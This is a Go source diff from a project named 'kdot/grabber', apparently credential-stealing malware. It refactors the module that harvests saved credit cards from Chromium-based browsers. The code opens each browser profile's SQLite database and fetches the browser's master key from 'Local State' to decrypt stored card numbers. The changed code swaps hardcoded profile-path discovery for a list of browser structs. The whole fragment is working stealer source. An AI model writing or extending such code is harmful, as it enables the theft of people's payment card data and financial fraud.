@@ -3,10 +3,8 @@ package cards
 import (
 	"database/sql"
 	"encoding/json"
-	"os"
-	"strings"
 
-	"kdot/grabber/browsers/util"
+	"kdot/grabber/browsers/chromium/structs"
 	"kdot/grabber/decryption"
 )
 
@@ -17,32 +15,14 @@ type Cards struct {
 	Card_number_encrypted string `json:"Card_number_encrypted"`
 }
 
-func Get() string {
+func Get(browsersList []structs.Browser) string {
 	var cards []Cards
-	dpPaths := util.GetBPth()
-	extraPaths := util.GetProfiles()
-	for _, path := range dpPaths {
-		// check if the path exists
-		if _, err := os.Stat(path); os.IsNotExist(err) {
-			continue
-		}
-		master_key := decryption.GetMasterKey(path + "\\Local State")
-		ranOpera := false
-		for _, profile := range extraPaths {
-			if ranOpera {
-				break
-			} else if strings.Contains(path, "Opera") {
-				profile = path
-				if _, err := os.Stat(path); os.IsNotExist(err) {
-					continue
-				}
-			} else {
-				if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
-					continue
-				}
-				path = path + "\\" + profile
-			}
-			db, err := sql.Open("sqlite3", path+"\\Web Data")
+	for _, browser := range browsersList {
+		for _, profile := range browser.Profiles {
+			path := profile.LoginData
+
+			master_key := decryption.GetMasterKey(browser.LocalState)
+			db, err := sql.Open("sqlite3", path)
 			if err != nil {
 				continue
 			}
